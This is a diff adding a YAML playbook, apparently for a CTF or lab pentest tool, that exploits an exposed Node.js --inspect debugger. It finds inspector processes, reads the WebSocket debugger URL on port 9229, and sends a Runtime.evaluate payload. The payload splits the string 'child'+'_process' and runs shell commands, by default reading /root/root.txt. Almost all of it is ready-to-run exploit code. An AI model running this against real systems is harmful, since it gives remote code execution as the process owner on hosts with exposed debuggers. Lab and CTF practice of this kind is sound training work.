@@ -1,0 +1,33 @@
+name: nodejs_inspector_rce
+description: Discover, tunnel, and exploit a Node.js --inspect debugger for RCE as the process owner
+vars:
+  CMD: "id; hostname; cat /root/root.txt"
+steps:
+  - title: Discover --inspect processes on box (run via SSH yourself)
+    command: echo "On target run -> ps -ef | grep -iE -- '--inspect|--inspect-brk' | grep -v grep"
+    continue_on_error: true
+
+  - title: List inspector targets locally (assumes tunnel is already up on 9229)
+    command: curl -s http://127.0.0.1:9229/json/list | jq .
+    continue_on_error: false
+
+  - title: Extract webSocketDebuggerUrl into 0xq session var
+    command: |
+      WS=$(curl -s http://127.0.0.1:9229/json | jq -r '.[0].webSocketDebuggerUrl')
+      [ -z "$WS" ] && echo "ERROR: no inspector target found" && exit 1
+      echo "wsUrl=$WS"
+      q set WS_URL "$WS"
+    continue_on_error: false
+
+  - title: Fire Runtime.evaluate RCE with mainModule.require
+    command: |
+      python3 -c "
+      import json, urllib.request
+      from websocket import create_connection
+      ws_url = json.load(urllib.request.urlopen('http://127.0.0.1:9229/json/list'))[0]['webSocketDebuggerUrl']
+      ws = create_connection(ws_url)
+      ws.send(json.dumps({'id': 1, 'method': 'Runtime.evaluate', 'params': {'expression': \"process.mainModule.require('child'+'_process').execSync('{{CMD}}').toString()\", 'returnByValue': True}}))
+      print(json.loads(ws.recv())['result']['result'].get('value', 'NO VALUE'))
+      ws.close()
+      "
+    continue_on_error: false
